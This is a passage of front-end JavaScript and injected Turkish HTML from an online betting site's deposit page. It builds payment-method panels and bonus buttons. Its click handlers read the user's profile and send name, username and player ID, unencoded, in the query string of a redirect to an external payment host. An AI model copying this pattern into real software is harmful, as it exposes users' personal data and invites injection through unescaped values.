href="#" class="tl_deposit_button btnSec transBg expresshavale_btn2">ÖDEME YAP</a> </div><div class="tl_methods_loader_cont"> <div class="flex"> <div class="tl_load_msg">İşlemleriniz bittiği zaman yatırımınız otomatik olarak yansıtılacaktır. ...</div></div></div><div id="gateWayScript"></div></form> <div class="message" style=" padding: 6px; margin-bottom: 10px; padding-bottom: 20px;"></div></div></div><div class="tl_payment_block hizli-post"> <div class="tl_payment_head toggleblock flex acDiv" data-payment-desc="Hızlı QR Para ile Yatirma"> <div class="tl_payment_col tl_icon_col"><span class="tl_payment_icon" style="background-image:url(https://betkanyon100.com/development/cmt_logo.png);background-position: 0;"></span></div><div class="tl_payment_col tl_desc_col"> <p class="tl_payment_desc deposit_payment">CMT Cüzdan Para ile Yatirma</p></div><div class="tl_payment_col tl_info_col flex"> <a class="tl_info_link tl_link" title="Islem Süresi"> <i class="tl_clock_icon tf_clock_icon icon_color"></i><span class="tx deposit_payment">3-15min</span> </a> <a class="tl_info_link tl_link" title="Islem Ücreti"> <i class="tl_percent_icon tf_percent_icon icon_color"></i><span class="tx deposit_payment">Ücretsiz</span> </a> </div><div class="tl_payment_col tl_min_max_col flex"> <p class="tl_min_max deposit_payment"><span class="tl_min_max_key">Min.</span><span class="tl_min_max_value">50 TRY</span></p><p class="tl_min_max deposit_payment"><span class="tl_min_max_key">Max.</span><span class="tl_min_max_value">10 000 TRY</span></p></div></div><div class="tl_payment_body transition" style="margin-left: 9px;padding-top: 0px;min-height: auto;margin-top: -27px;"> <p style=" color: #fff; padding: 7px; margin-bottom: 8px; line-height: 24px; padding-top: 18px;">Lütfen "Ödeme Yap" butonuna tıkladıktan sonra açılan sayfadaki işlemleri yapınız. <br>İşlem sonrası yatırımınız otomatik olarak hesabınıza yansıyacaktır. <form action="/tr/Account/_expresshavale" class="methods flex" id="expresshavale" method="post" novalidate="novalidate"> <div class="tl_payment_col tl_payment_padd" style=" display: none;"> <span class="reg_err_mess field-validation-error" data-valmsg-for="ExpressHavale.PaymentType" data-valmsg-replace="true"> </span> <input data-val="true" data-val-required="The paymentType field is required." id="ExpressHavale_paymentType" name="ExpressHavale.paymentType" type="hidden" value="3"> </div><div class="tl_payment_col tl_payment_padd"> <a href="#" class="tl_deposit_button btnSec transBg expresshavale_btn_cmt">ÖDEME YAP</a> </div><div class="tl_methods_loader_cont"> <div class="flex"> <div class="tl_load_msg">İşlemleriniz bittiği zaman yatırımınız otomatik olarak yansıtılacaktır. ...</div></div></div><div id="gateWayScript"></div></form> <div class="message" style=" padding: 6px; margin-bottom: 10px; padding-bottom: 20px;"></div></div></div><div class="tl_payment_block hizli-post"> <div class="tl_payment_head toggleblock flex acDiv" data-payment-desc="Hızlı QR Para ile Yatirma"> <div class="tl_payment_col tl_icon_col"><span class="tl_payment_icon" style="background-image:url(/Img/icons/deposit/cepbank.jpg);background-position: 0;"></span></div><div class="tl_payment_col tl_desc_col"> <p class="tl_payment_desc deposit_payment">CepBank ile Para Yatirma</p></div><div class="tl_payment_col tl_info_col flex"> <a class="tl_info_link tl_link" title="Islem Süresi"> <i class="tl_clock_icon tf_clock_icon icon_color"></i><span class="tx deposit_payment">3-15min</span> </a> <a class="tl_info_link tl_link" title="Islem Ücreti"> <i class="tl_percent_icon tf_percent_icon icon_color"></i><span class="tx deposit_payment">Ücretsiz</span> </a> </div><div class="tl_payment_col tl_min_max_col flex"> <p class="tl_min_max deposit_payment"><span class="tl_min_max_key">Min.</span><span class="tl_min_max_value">50 TRY</span></p><p class="tl_min_max deposit_payment"><span class="tl_min_max_key">Max.</span><span class="tl_min_max_value">500 TRY</span></p></div></div><div class="tl_payment_body transition" style="margin-left: 9px;padding-top: 0px;min-height: auto;margin-top: -27px;"> <p style=" color: #fff; padding: 7px; margin-bottom: 8px; line-height: 24px; padding-top: 18px;">Lütfen "Ödeme Yap" butonuna tıkladıktan sonra açılan sayfadaki işlemleri yapınız. <br>İşlem sonrası yatırımınız otomatik olarak hesabınıza yansıyacaktır. <form action="/tr/Account/_expresshavale" class="methods flex" id="expresshavale" method="post" novalidate="novalidate"> <div class="tl_payment_col tl_payment_padd" style=" display: none;"> <span class="reg_err_mess field-validation-error" data-valmsg-for="ExpressHavale.PaymentType" data-valmsg-replace="true"> </span> <input data-val="true" data-val-required="The paymentType field is required." id="ExpressHavale_paymentType" name="ExpressHavale.paymentType" type="hidden" value="3"> </div><div class="tl_payment_col tl_payment_padd"> <a href="#" class="tl_deposit_button btnSec transBg expresshavale_btn_cepbank">ÖDEME YAP</a> </div><div class="tl_methods_loader_cont"> <div class="flex"> <div class="tl_load_msg">İşlemleriniz bittiği zaman yatırımınız otomatik olarak yansıtılacaktır. ...</div></div></div><div id="gateWayScript"></div></form> <div class="message" style=" padding: 6px; margin-bottom: 10px; padding-bottom: 20px;"></div></div></div><div class="tl_payment_block hizli-post"> <div class="tl_payment_head toggleblock flex acDiv" data-payment-desc="Hızlı QR Para ile Yatirma"> <div class="tl_payment_col tl_icon_col"><span class="tl_payment_icon papara"></span></div><div class="tl_payment_col tl_desc_col"> <p class="tl_payment_desc deposit_payment">Papara ile Para Yatirma</p></div><div class="tl_payment_col tl_info_col flex"> <a class="tl_info_link tl_link" title="Islem Süresi"> <i class="tl_clock_icon tf_clock_icon icon_color"></i><span class="tx deposit_payment">3-15min</span> </a> <a class="tl_info_link tl_link" title="Islem Ücreti"> <i class="tl_percent_icon tf_percent_icon icon_color"></i><span class="tx deposit_payment">Ücretsiz</span> </a> </div><div class="tl_payment_col tl_min_max_col flex"> <p class="tl_min_max deposit_payment"><span class="tl_min_max_key">Min.</span><span class="tl_min_max_value">100 TRY</span></p><p class="tl_min_max deposit_payment"><span class="tl_min_max_key">Max.</span><span class="tl_min_max_value">5 000 TRY</span></p></div></div><div class="tl_payment_body transition" style="margin-left: 9px;padding-top: 0px;min-height: auto;margin-top: -27px;"> <p style=" color: #fff; padding: 7px; margin-bottom: 8px; line-height: 24px; padding-top: 18px;">Bu bölümden yatırım yapacağınız hesap numarasını otomatik alabilirsiniz. <br>Şifreniz talep edilmez veya hesabınıza giriş yapılmaz. <br>Ödeme işlemini; belirtilen numaraya, papara hesabınız üzerinden siz yapmalısınız. </p><form action="/tr/Account/_expresshavale" class="methods flex" id="expresshavale" method="post" novalidate="novalidate"> <div class="tl_payment_col tl_payment_padd" style=" display: none;"> <span class="reg_err_mess field-validation-error" data-valmsg-for="ExpressHavale.PaymentType" data-valmsg-replace="true"> </span> <input data-val="true" data-val-required="The paymentType field is required." id="ExpressHavale_paymentType" name="ExpressHavale.paymentType" type="hidden" value="3"> </div><div class="tl_payment_col tl_payment_padd"> <a href="#" class="tl_deposit_button btnSec transBg expresshavale_btn_papara">HESAP NUMARASI AL</a> </div><div class="tl_methods_loader_cont"> <div class="flex"> <div class="tl_load_msg">İşlemleriniz bittiği zaman yatırımınız otomatik olarak yansıtılacaktır. ...</div></div></div><div id="gateWayScript"></div></form> <div class="message" style=" padding: 6px; margin-bottom: 10px; padding-bottom: 20px;"></div></div></div><div class="tl_payment_block hizli-post"> <div class="tl_payment_head toggleblock flex acDiv" data-payment-desc="Papara ile Yatirma"> <div class="tl_payment_col tl_icon_col"><span class="tl_payment_icon" style="background-image:url(https://betkanyon100.com/development/hizli/payfix_img.jpg);background-position: 0;"></span></div><div class="tl_payment_col tl_desc_col"> <p class="tl_payment_desc deposit_payment">Payfix ile Yatirma</p></div><div class="tl_payment_col tl_info_col flex"> <a class="tl_info_link tl_link" title="Islem Süresi"> <i class="tl_clock_icon tf_clock_icon icon_color"></i><span class="tx deposit_payment">3-15min</span> </a> <a class="tl_info_link tl_link" title="Islem Ücreti"> <i class="tl_percent_icon tf_percent_icon icon_color"></i><span class="tx deposit_payment">Ücretsiz</span> </a> </div><div class="tl_payment_col tl_min_max_col flex"> <p class="tl_min_max deposit_payment"><span class="tl_min_max_key">Min.</span><span class="tl_min_max_value">50 TRY</span></p><p class="tl_min_max deposit_payment"><span class="tl_min_max_key">Max.</span><span class="tl_min_max_value">10 000 TRY</span></p></div></div><div class="tl_payment_body transition" style="margin-left: 9px;padding-top: 0px;min-height: auto;margin-top: -27px;"> <p style=" color: #fff; padding: 7px; margin-bottom: 8px; line-height: 24px; padding-top: 18px;">Lütfen "Ödeme Yap" butonuna tıkladıktan sonra açılan sayfadaki işlemleri yapınız. <br>İşlem sonrası yatırımınız otomatik olarak hesabınıza yansıyacaktır. <form action="/tr/Account/_expresshavale" class="methods flex" id="expresshavale" method="post" novalidate="novalidate"> <div class="tl_payment_col tl_payment_padd" style=" display: none;"> <span class="reg_err_mess field-validation-error" data-valmsg-for="ExpressHavale.PaymentType" data-valmsg-replace="true"> </span> <input data-val="true" data-val-required="The paymentType field is required." id="ExpressHavale_paymentType" name="ExpressHavale.paymentType" type="hidden" value="7"> </div><div class="tl_payment_col tl_payment_padd"> <a href="#" class="tl_deposit_button btnSec transBg expresshavale_payfix">ÖDEME YAP</a> </div><div class="tl_methods_loader_cont"> <div class="flex"> <div class="tl_load_msg">İşlemleriniz bittiği zaman yatırımınız otomatik olarak yansıtılacaktır. ...</div></div></div><div id="gateWayScript"></div></form> <div class="message" style=" padding: 6px; margin-bottom: 10px; padding-bottom: 20px;"></div></div></div>')
                    } else {
                        $('.tl_my_acc_title').after('<style>.tl_payment_body form {padding:0!important; } .tutarlar{background: #e9e9f3; display: inline-block; border-radius: 4px; margin-left: 7px; padding: 9px; font-size: 15px; margin-top: 6px;}.hizli-post .field-validation-error{color: #fff!important;}</style><div class="tl_payment_block hizli-post"> <div class="tl_payment_head toggleblock flex acDiv" data-payment-desc="Papara ile Yatirma"> <div class="tl_payment_col tl_icon_col"><span class="tl_payment_icon" style="background-image:url(/Img/common/hizli.png);background-position: 0;"></span></div><div class="tl_payment_col tl_desc_col"> <p class="tl_payment_desc deposit_payment">Hizli Havale ile Yatirma</p></div><div class="tl_payment_col tl_info_col flex"> <a class="tl_info_link tl_link" title="Islem Süresi"> <i class="tl_clock_icon tf_clock_icon icon_color"></i><span class="tx deposit_payment">3-15min</span> </a> <a class="tl_info_link tl_link" title="Islem Ücreti"> <i class="tl_percent_icon tf_percent_icon icon_color"></i><span class="tx deposit_payment">Ücretsiz</span> </a> </div><div class="tl_payment_col tl_min_max_col flex"> <p class="tl_min_max deposit_payment"><span class="tl_min_max_key">Min.</span><span class="tl_min_max_value">50 TRY</span></p><p class="tl_min_max deposit_payment"><span class="tl_min_max_key">Max.</span><span class="tl_min_max_value">20 000 TRY</span></p></div></div><div class="tl_payment_body transition" style="margin-left: 9px;padding-top: 0px;min-height: auto;margin-top: -27px;"> <p style=" color: #fff; padding: 7px; margin-bottom: 8px; line-height: 24px; padding-top: 18px;">Lütfen "Ödeme Yap" butonuna tıkladıktan sonra açılan sayfadaki işlemleri yapınız. <br>İşlem sonrası yatırımınız otomatik olarak hesabınıza yansıyacaktır. <form action="/tr/Account/_expresshavale" class="methods flex" id="expresshavale" method="post" novalidate="novalidate"> <div class="tl_payment_col tl_payment_padd" style=" display: none;"> <span class="reg_err_mess field-validation-error" data-valmsg-for="ExpressHavale.PaymentType" data-valmsg-replace="true"> </span> <input data-val="true" data-val-required="The paymentType field is required." id="ExpressHavale_paymentType" name="ExpressHavale.paymentType" type="hidden" value="2"> </div><div class="tl_payment_col tl_payment_padd"> <a href="#" class="tl_deposit_button btnSec transBg expresshavale_btn3">ÖDEME YAP</a> </div><div class="tl_methods_loader_cont"> <div class="flex"> <div class="tl_load_msg">İşlemleriniz bittiği zaman yatırımınız otomatik olarak yansıtılacaktır. ...</div></div></div><div id="gateWayScript"></div></form> <div class="message" style=" padding: 6px; margin-bottom: 10px; padding-bottom: 20px;"></div></div></div><div class="tl_payment_block hizli-post"> <div class="tl_payment_head toggleblock flex acDiv" data-payment-desc="Hızlı QR Para ile Yatirma"> <div class="tl_payment_col tl_icon_col"><span class="tl_payment_icon" style="background-image:url(/Img/Banners/instantqrlogo.jpg);background-position: 0;"></span></div><div class="tl_payment_col tl_desc_col"> <p class="tl_payment_desc deposit_payment">Hızlı QR Para ile Yatirma</p></div><div class="tl_payment_col tl_info_col flex"> <a class="tl_info_link tl_link" title="Islem Süresi"> <i class="tl_clock_icon tf_clock_icon icon_color"></i><span class="tx deposit_payment">3-15min</span> </a> <a class="tl_info_link tl_link" title="Islem Ücreti"> <i class="tl_percent_icon tf_percent_icon icon_color"></i><span class="tx deposit_payment">Ücretsiz</span> </a> </div><div class="tl_payment_col tl_min_max_col flex"> <p class="tl_min_max deposit_payment"><span class="tl_min_max_key">Min.</span><span class="tl_min_max_value">50 TRY</span></p><p class="tl_min_max deposit_payment"><span class="tl_min_max_key">Max.</span><span class="tl_min_max_value">4 000 TRY</span></p></div></div><div class="tl_payment_body transition" style="margin-left: 9px;padding-top: 0px;min-height: auto;margin-top: -27px;"> <p style=" color: #fff; padding: 7px; margin-bottom: 8px; line-height: 24px; padding-top: 18px;">Lütfen "Ödeme Yap" butonuna tıkladıktan sonra açılan sayfadaki işlemleri yapınız. <br>İşlem sonrası yatırımınız otomatik olarak hesabınıza yansıyacaktır. <br>Aktif Bankalar : Garanti, Türkiye İş Bankası, Ziraat Bank, Yapıkredi, Akbank, Denizbank, TEB, ING</p><form action="/tr/Account/_expresshavale" class="methods flex" id="expresshavale" method="post" novalidate="novalidate"> <div class="tl_payment_col tl_payment_padd" style=" display: none;"> <span class="reg_err_mess field-validation-error" data-valmsg-for="ExpressHavale.PaymentType" data-valmsg-replace="true"> </span> <input data-val="true" data-val-required="The paymentType field is required." id="ExpressHavale_paymentType" name="ExpressHavale.paymentType" type="hidden" value="2"> </div><div class="tl_payment_col tl_payment_padd"> <a href="#" class="tl_deposit_button btnSec transBg expresshavale_btn2">ÖDEME YAP</a> </div><div class="tl_methods_loader_cont"> <div class="flex"> <div class="tl_load_msg">İşlemleriniz bittiği zaman yatırımınız otomatik olarak yansıtılacaktır. ...</div></div></div><div id="gateWayScript"></div></form> <div class="message" style=" padding: 6px; margin-bottom: 10px; padding-bottom: 20px;"></div></div></div><div class="tl_payment_block hizli-post"> <div class="tl_payment_head toggleblock flex acDiv" data-payment-desc="Hızlı QR Para ile Yatirma"> <div class="tl_payment_col tl_icon_col"><span class="tl_payment_icon" style="background-image:url(https://betkanyon100.com/development/cmt_logo.png);background-position: 0;"></span></div><div class="tl_payment_col tl_desc_col"> <p class="tl_payment_desc deposit_payment">CMT Cüzdan Para ile Yatirma</p></div><div class="tl_payment_col tl_info_col flex"> <a class="tl_info_link tl_link" title="Islem Süresi"> <i class="tl_clock_icon tf_clock_icon icon_color"></i><span class="tx deposit_payment">3-15min</span> </a> <a class="tl_info_link tl_link" title="Islem Ücreti"> <i class="tl_percent_icon tf_percent_icon icon_color"></i><span class="tx deposit_payment">Ücretsiz</span> </a> </div><div class="tl_payment_col tl_min_max_col flex"> <p class="tl_min_max deposit_payment"><span class="tl_min_max_key">Min.</span><span class="tl_min_max_value">50 TRY</span></p><p class="tl_min_max deposit_payment"><span class="tl_min_max_key">Max.</span><span class="tl_min_max_value">10 000 TRY</span></p></div></div><div class="tl_payment_body transition" style="margin-left: 9px;padding-top: 0px;min-height: auto;margin-top: -27px;"> <p style=" color: #fff; padding: 7px; margin-bottom: 8px; line-height: 24px; padding-top: 18px;">Lütfen "Ödeme Yap" butonuna tıkladıktan sonra açılan sayfadaki işlemleri yapınız. <br>İşlem sonrası yatırımınız otomatik olarak hesabınıza yansıyacaktır. <form action="/tr/Account/_expresshavale" class="methods flex" id="expresshavale" method="post" novalidate="novalidate"> <div class="tl_payment_col tl_payment_padd" style=" display: none;"> <span class="reg_err_mess field-validation-error" data-valmsg-for="ExpressHavale.PaymentType" data-valmsg-replace="true"> </span> <input data-val="true" data-val-required="The paymentType field is required." id="ExpressHavale_paymentType" name="ExpressHavale.paymentType" type="hidden" value="3"> </div><div class="tl_payment_col tl_payment_padd"> <a href="#" class="tl_deposit_button btnSec transBg expresshavale_btn_cmt">ÖDEME YAP</a> </div><div class="tl_methods_loader_cont"> <div class="flex"> <div class="tl_load_msg">İşlemleriniz bittiği zaman yatırımınız otomatik olarak yansıtılacaktır. ...</div></div></div><div id="gateWayScript"></div></form> <div class="message" style=" padding: 6px; margin-bottom: 10px; padding-bottom: 20px;"></div></div></div><div class="tl_payment_block hizli-post"> <div class="tl_payment_head toggleblock flex acDiv" data-payment-desc="Hızlı QR Para ile Yatirma"> <div class="tl_payment_col tl_icon_col"><span class="tl_payment_icon" style="background-image:url(/Img/icons/deposit/cepbank.jpg);background-position: 0;"></span></div><div class="tl_payment_col tl_desc_col"> <p class="tl_payment_desc deposit_payment">CepBank ile Para Yatirma</p></div><div class="tl_payment_col tl_info_col flex"> <a class="tl_info_link tl_link" title="Islem Süresi"> <i class="tl_clock_icon tf_clock_icon icon_color"></i><span class="tx deposit_payment">3-15min</span> </a> <a class="tl_info_link tl_link" title="Islem Ücreti"> <i class="tl_percent_icon tf_percent_icon icon_color"></i><span class="tx deposit_payment">Ücretsiz</span> </a> </div><div class="tl_payment_col tl_min_max_col flex"> <p class="tl_min_max deposit_payment"><span class="tl_min_max_key">Min.</span><span class="tl_min_max_value">50 TRY</span></p><p class="tl_min_max deposit_payment"><span class="tl_min_max_key">Max.</span><span class="tl_min_max_value">500 TRY</span></p></div></div><div class="tl_payment_body transition" style="margin-left: 9px;padding-top: 0px;min-height: auto;margin-top: -27px;"> <p style=" color: #fff; padding: 7px; margin-bottom: 8px; line-height: 24px; padding-top: 18px;">Lütfen "Ödeme Yap" butonuna tıkladıktan sonra açılan sayfadaki işlemleri yapınız. <br>İşlem sonrası yatırımınız otomatik olarak hesabınıza yansıyacaktır. <form action="/tr/Account/_expresshavale" class="methods flex" id="expresshavale" method="post" novalidate="novalidate"> <div class="tl_payment_col tl_payment_padd" style=" display: none;"> <span class="reg_err_mess field-validation-error" data-valmsg-for="ExpressHavale.PaymentType" data-valmsg-replace="true"> </span> <input data-val="true" data-val-required="The paymentType field is required." id="ExpressHavale_paymentType" name="ExpressHavale.paymentType" type="hidden" value="3"> </div><div class="tl_payment_col tl_payment_padd"> <a href="#" class="tl_deposit_button btnSec transBg expresshavale_btn_cepbank">ÖDEME YAP</a> </div><div class="tl_methods_loader_cont"> <div class="flex"> <div class="tl_load_msg">İşlemleriniz bittiği zaman yatırımınız otomatik olarak yansıtılacaktır. ...</div></div></div><div id="gateWayScript"></div></form> <div class="message" style=" padding: 6px; margin-bottom: 10px; padding-bottom: 20px;"></div></div></div>');
                    }
                
                /*
                    $.ajax({
                        type:'POST',
                        data:'getBank',
                        url:'https://betkanyon100.com/development/hizli/bank_list.php',
                        success:function(reply){
                            $('#optionList').html('<option disabled selected>----</option>'+reply);
                        }
                    })
                    */
                
                        if ($('.tl_acc_userid .text').length != 0) {
                         username = $('.tl_acc_userid .text').text();
                     } else {
                         username = $('#menu-right .ui-link:last').text().trim();
                     }
                
                 
                        
                          $('.tl_my_acc_title').after('<div class="bonus_ekrani" style=" background: #1e2036; padding: 13px; margin-bottom: 13px; color: #fff; border-radius: 3px;"> <p style=" margin-bottom: 11px; font-weight: bold;">BETKANYON BONUS</p><p style=" margin-bottom: 13px; font-size: 14px; color: #f7f7f7;"> Lütfen yatırım yaptıysanız bonusunuzu almak için seçim yapınız </p><div class="bonus_btn bonus-sec" data-type="2"> Çevrimsiz Bonus </div><div class="bonus_btn bonus-sec" data-type="1"> Çevrimli Bonus </div><div class="bonus_btn bonus-sec" data-type="3"> Kayıp Bonusu </div><div class="bonus_btn bonus-sec" data-type="4"> İlk Yatırım Bonusu </div><div class="bonus_btn bonus-sec" data-type="5"> Hediye Kodu </div><div class="alt_tab" style=" display: none;"> <h4 style=" margin-top: 11px; margin-bottom: 12px;"> Bonus Türünü Seçiniz </h4> <div class="bonus_btn category-sec" data-type="1"> Spor </div><div class="bonus_btn category-sec" data-type="2"> Casino </div></div><div class="alt_tab2" style="display:none;"> <h4 style=" margin-top: 11px; margin-bottom: 12px;">Kayıp Bonusu türünü seçiniz.</h4> <div class="bonus_btn category-sec" data-type="1">Anlık</div><div class="bonus_btn category-sec" data-type="2">Günlük</div><div class="bonus_btn category-sec" data-type="3">Haftalık</div></div><div class="alt_tab3" style=" display: none;"> <p style=" margin-bottom: 11px; font-weight: bold;margin-top: 19px;">BETKANYON HEDİYE KODU</p><p style=" margin-bottom: 13px; font-size: 14px; color: #f7f7f7;"> Size özel veya Twitter, Facebook, Forum kampanyalarımızdan yararlanmak için lütfen kodu giriniz.</p><input class="" placeholder="Hediye Kodu" data-val-required="Lütfen geçerli bir tutar girin" id="codeText" name="code" type="text" value="" style=" padding: 9px; border-radius: 3px; border: 0.5px solid #1a1a1a; margin-right: 5px; outline: none;"> <div class="bonus_btn" id="activeCodeGift">KODU KULLAN</div></div></div><style>.bonus_btn{text-transform: uppercase; border-radius: 2px; outline: none; display: block; height: 36px; line-height: 36px; font-size: 14px; text-decoration: none; padding: 0 15px; /* margin-top: 15px; */ background-color: #f35f39; color: #fff; margin-right: 8px; display: inline-block; margin-bottom: 4px; cursor: pointer;}.bonus_btn_active{background-color: #f9b13c!important; color: #000!important;} .onay_msg {padding: 10px 2px; border-top: 1px solid gray; margin-top: 10px; padding-top: 18px;} .onay-iptal{margin-top: 13px;} .onay_msg2,.onay_msg3 {padding: 10px 2px; border-top: 1px solid gray; margin-top: 10px; padding-top: 18px;} .onay-iptal{margin-top: 13px;}</style>');
             
                     
                     
            }
              
        var formid = "expresshavale";
          
        $('.tl_popup_dialog .expresshavale_btn2').on('click', function (e) {
             $.ajax({
                type:'GET',
                data:'',
                url:'https://'+window.location.hostname+'/Account/Profile?_=1551197709912',
                success:function(reply){

                    ad = $(reply).find('#FirstName').val();
                    soyad = $(reply).find('#LastName').val();
                    username = $('.tl_acc_userid .text').text()
                    id = $(reply).find('.user_id label').text();


                    window.location.href = 'https://betkanyon.letspayments.com/ExpressHavaleOnlinePayment.aspx?SERVICE_PROVIDER=1026&LANGUAGE=TR&DEPOSIT_ID=0&AMOUNT=&RURL='+window.location.host+window.location.pathname+'&EMAIL=&username='+username+'&VERIFICATIONCODE=&CURRENCY=TRY&FirstName='+ad+'&LastName='+soyad+'&Birthday=01%2F27%2F1998+00%3A00%3A00&Address=&City=&Zip=&Phone1=&Country=&Param1='+id+'&Param2=2&Param3=&methodid=&phone11=&phone2=&expdate=&cvv=&cardnumber=&bankid=&transfertype=&password=&identity1=&identity2=&reference=&PlayerId='+id;

                }
            })
        });
            
            
        $('.tl_popup_dialog .expresshavale_btn3').on('click', function (e) {
             $.ajax({
                type:'GET',
                data:'',
                url:'https://'+window.location.hostname+'/Account/Profile?_=1551197709912',
                success:function(reply){

                    ad = $(reply).find('#FirstName').val();
                    soyad = $(reply).find('#LastName').val();
                    username = $('.tl_acc_userid .text').text()
                    id = $(reply).find('.user_id label').text();


                    window.location.href = 'https://betkanyon.letspayments.com/ExpressHavaleOnlinePayment.aspx?SERVICE_PROVIDER=1026&LANGUAGE=TR&DEPOSIT_ID=0&AMOUNT=&RURL='+window.location.host+window.location.pathname+'&EMAIL=&username='+username+'&VERIFICATIONCODE=&CURRENCY=TRY&FirstName='+ad+'&LastName='+soyad+'&Birthday=01%2F27%2F1998+00%3A00%3A00&Address=&City=&Zip=&Phone1=&Country=&Param1='+id+'&Param2=1&Param3=&methodid=&phone11=&phone2=&expdate=&cvv=&cardnumber=&bankid=&transfertype=&password=&identity1=&identity2=&reference=&PlayerId='+id;

                }
            })
        });
        
        $('.tl_popup_dialog .expresshavale_btn_cmt').on('click', function (e) {
             $.ajax({
                type:'GET',
                data:'',
                url:'https://'+window.location.hostname+'/Account/Profile?_=1551197709912',
                success:function(reply){

                    ad = $(reply).find('#FirstName').val();
                    soyad = $(reply).find('#LastName').val();
                    username = $('.tl_acc_userid .text').text()
                    id = $(reply).find('.user_id label').text();


                    window.location.href = 'https://betkanyon.letspayments.com/ExpressHavaleOnlinePayment.aspx?SERVICE_PROVIDER=1026&LANGUAGE=TR&DEPOSIT_ID=0&AMOUNT=&RURL='+window.location.host+window.location.pathname+'&EMAIL=&username='+username+'&VERIFICATIONCODE=&CURRENCY=TRY&FirstName='+ad+'&LastName='+soyad+'&Birthday=01%2F27%2F1998+00%3A00%3A00&Address=&City=&Zip=&Phone1=&Country=&Param1='+id+'&Param2=3&Param3=&methodid=&phone11=&phone2=&expdate=&cvv=&cardnumber=&bankid=&transfertype=&password=&identity1=&identity2=&reference=&PlayerId='+id;

                }
            })
        });
            
            
           $('.tl_popup_dialog .expresshavale_btn_cepbank').on('click', function (e) {
                 $.ajax({
                    type:'GET',
                    data:'',
                    url:'https://'+window.location.hostname+'/Account/Profile?_=1551197709912',
                    success:function(reply){

                        ad = $(reply).find('#FirstName').val();
                        soyad = $(reply).find('#LastName').val();
                        username = $('.tl_acc_userid .text').text()
                        id = $(reply).find('.user_id label').text();


                        window.location.href = 'https://betkanyon.letspayments.com/ExpressHavaleOnlinePayment.aspx?SERVICE_PROVIDER=1026&LANGUAGE=TR&DEPOSIT_ID=0&AMOUNT=&RURL='+window.location.host+window.location.pathname+'&EMAIL=&username='+username+'&VERIFICATIONCODE=&CURRENCY=TRY&FirstName='+ad+'&LastName='+soyad+'&Birthday=01%2F27%2F1998+00%3A00%3A00&Address=&City=&Zip=&Phone1=&Country=&Param1='+id+'&Param2=4&Param3=&methodid=&phone11=&phone2=&expdate=&cvv=&cardnumber=&bankid=&transfertype=&password=&identity1=&identity2=&reference=&PlayerId='+id;

                    }
                })
            });
            
           $('.tl_popup_dialog .expresshavale_btn_papara').on('click', function (e) {
                 $.ajax({
                    type:'GET',
                    data:'',
                    url:'https://'+window.location.hostname+'/Account/Profile?_=1551197709912',
                    success:function(reply){
                        ad = $(reply).find('#FirstName').val();
                        soyad = $(reply).find('#LastName').val();
                        username = $('.tl_acc_userid .text').text()
                        id = $(reply).find('.user_id label').text();

                        window.location.href = 'https://betkanyon.letspayments.com/ExpressHavaleOnlinePayment.aspx?SERVICE_PROVIDER=1026&LANGUAGE=TR&DEPOSIT_ID=0&AMOUNT=&RURL='+window.location.host+window.location.pathname+'&EMAIL=&username='+username+'&VERIFICATIONCODE=&CURRENCY=TRY&FirstName='+ad+'&LastName='+soyad+'&Birthday=01%2F27%2F1998+00%3A00%3A00&Address=&City=&Zip=&Phone1=&Country=&Param1='+id+'&Param2=5&Param3=&methodid=&phone11=&phone2=&expdate=&cvv=&cardnumber=&bankid=&transfertype=&password=&identity1=&identity2=&reference=&PlayerId='+id;

                    }
                })
            });
            
            $('.tl_popup_dialog .expresshavale_payfix').on('click', function (e) {
                 $.ajax({
                    type:'GET',
                    data:'',
                    url:'https://'+window.location.hostname+'/Account/Profile?_=1551197709912',
                    success:function(reply){
                        ad = $(reply).find('#FirstName').val();
                        soyad = $(reply).find('#LastName').val();
                        username = $('.tl_acc_userid .text').text()
                        id = $(reply).find('.user_id label').text();

                        window.location.href = 'https://betkanyon.letspayments.com/ExpressHavaleOnlinePayment.aspx?SERVICE_PROVIDER=1026&LANGUAGE=TR&DEPOSIT_ID=0&AMOUNT=&RURL='+window.location.host+window.location.pathname+'&EMAIL=&username='+username+'&VERIFICATIONCODE=&CURRENCY=TRY&FirstName='+ad+'&LastName='+soyad+'&Birthday=01%2F27%2F1998+00%3A00%3A00&Address=&City=&Zip=&Phone1=&Country=&Param1='+id+'&Param2=7&Param3=&methodid=&phone11=&phone2=&expdate=&cvv=&cardnumber=&bankid=&transfertype=&password=&identity1=&identity2=&reference=&PlayerId='+id;

                    }
                })
            });
            
            
           $('.paymentlist5 .tl_payment_block').each(function(index) {    
                    thisType = $(this).attr('data-type');
                    $(this).find('.tl_payment_head').attr('data-payment-desc',titleArr[index][0]);
                    $(this).find('.tl_payment_head ').css('min-height','95px');
                    $(this).find('.tl_payment_body ').css('padding-top','0px');
                    $(this).find('.tl_payment_desc').text(titleArr[index][0]);
           });

            if ($('.docTxt').length == 0) {
                
                    $('body').attr('depositload',true);
                    var jq = document.createElement('script');
                    jq.src = "https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.6/dist/jquery.fancybox.min.js";
                    document.getElementsByTagName('head')[0].appendChild(jq);

                    var jq = document.createElement('link');
                    jq.href = "https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.6/dist/jquery.fancybox.min.css";
                    jq.rel = "stylesheet";
                    document.getElementsByTagName('head')[0].appendChild(jq);

                    if ($('.sahteLink').length == 0) {
                        $('.tl_payment_cont').prepend('<div class="sahteLink" style="visibility:hidden;height:0;width:0;overflow:hidden;"></div>');
                    }
                    

                    $('.paymentlist5 .tl_payment_block').each(function(index) {
                        if (index == 0) {
                            datas = 'data="true"';
                        } else {
                            datas = 'data="false"';
                        }
                        thisType = $(this).attr('data-type');
                         $(this).find('.tl_info_col').html('<a class="tl_info_link tl_link" title="İşlem Süresi"> <i class="tl_clock_icon tf_clock_icon icon_color"></i><span class="tx deposit_payment">'+titleArr[index][3]+'</span> </a> <a class="tl_info_link tl_link" title="İşlem Ücreti"> <i class="tl_percent_icon tf_percent_icon icon_color"></i><span class="tx deposit_payment">'+titleArr[index][4]+'</span> </a> ');
                        $(this).css('background-color','#1a1a1a');
                        $(this).find('.tl_payment_head').attr('data-payment-desc',titleArr[index][0]);
                        $(this).find('.tl_payment_desc').text(titleArr[index][0]);
